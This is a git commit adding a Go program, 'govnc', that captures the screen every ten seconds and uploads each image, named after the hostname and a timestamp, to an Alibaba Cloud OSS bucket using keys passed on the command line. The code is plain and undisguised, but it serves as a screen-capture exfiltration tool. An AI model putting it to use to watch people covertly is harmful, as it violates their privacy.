43f8def30d88bd0536e70a321b7c32d76bb37a55
pantom2077 <118233720+pantom2077@users.noreply.github.com>
2022-12-03 15:26:56 +0800

    上传

---
+++ go.mod
@@ -0,0 +1,14 @@
+module govnc
+
+go 1.18
+
+require github.com/vova616/screenshot v0.0.0-20220801010501-56c10359473c
+
+require (
+	github.com/BurntSushi/xgb v0.0.0-20210121224620-deaf085860bc // indirect
+	github.com/aliyun/aliyun-oss-go-sdk v2.2.6+incompatible // indirect
+	github.com/go-co-op/gocron v1.18.0 // indirect
+	github.com/robfig/cron/v3 v3.0.1 // indirect
+	golang.org/x/sync v0.0.0-20210220032951-036812b2e83c // indirect
+	golang.org/x/time v0.2.0 // indirect
+)
---
+++ main.go
@@ -0,0 +1,100 @@
+package main
+
+import (
+	"flag"
+	"fmt"
+	"image/png"
+	"net"
+	"os"
+	"strconv"
+	"strings"
+	"time"
+
+	"github.com/aliyun/aliyun-oss-go-sdk/oss"
+	"github.com/go-co-op/gocron"
+	"github.com/vova616/screenshot"
+)
+
+func screen() {
+	img, err := screenshot.CaptureScreen()
+	if err != nil {
+		panic(err)
+	}
+	f, err := os.Create("./ss.png")
+	if err != nil {
+		panic(err)
+	}
+	err = png.Encode(f, img)
+	if err != nil {
+		panic(err)
+	}
+	f.Close()
+}
+
+func uploadoss(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string) { //上传到阿里云oss
+	var hostname string
+
+	hostname, _ = os.Hostname()
+	// IP, err = GetOutBoundIP()
+	// if err != nil {
+	// 	fmt.Println(err)
+	// }
+	client, err := oss.New(Endpoint, AccessKeyId, AccessKeySecret)
+	if err != nil {
+		fmt.Print(err)
+	}
+	// 获取存储空间。
+	bucket, err := client.Bucket(bucketName)
+	if err != nil {
+		fmt.Print(err)
+	}
+
+	now := strconv.FormatInt(time.Now().Unix(), 10)
+	myobject := hostname + "_" + now + ".jpg"
+	// 上传文件。
+	err = bucket.PutObjectFromFile(myobject, LocalFile)
+	if err != nil {
+		fmt.Print(err)
+	} else {
+		fmt.Println(time.Unix(time.Now().Unix(), 0).Format("2006-01-02 15:04:05") + ": upload " + myobject + " succeeded")
+	}
+}
+
+func uploadingfile(str1 []string, Seconds int) {
+
+	directory := "./ss.png"
+	dir := strings.Replace(directory, "\\", "/", -1)
+	timezone, _ := time.LoadLocation("Asia/Shanghai")
+	s := gocron.NewScheduler(timezone)
+
+	// 每秒执行一次
+	s.Every(10).Seconds().Do(func() {
+		screen()                                           //截屏
+		uploadoss(str1[3], str1[1], str1[2], str1[0], dir) //上传
+	})
+	s.StartBlocking()
+
+}
+
+func GetOutBoundIP() (ip string, err error) { //获取本地使用的IP地址
+	conn, err := net.Dial("udp", "8.8.8.8:53")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	ip = strings.Split(localAddr.String(), ":")[0]
+	return
+}
+
+func main() {
+
+	var osskey string
+	var Seconds int
+
+	flag.StringVar(&osskey, "o", "", "format: bucketName:accessKeyId:accessKeySecret:endpoint")
+	flag.IntVar(&Seconds, "s", 30, "second")
+	flag.Parse()
+	str1 := strings.Split(osskey, ":")
+	uploadingfile(str1, Seconds)
+}
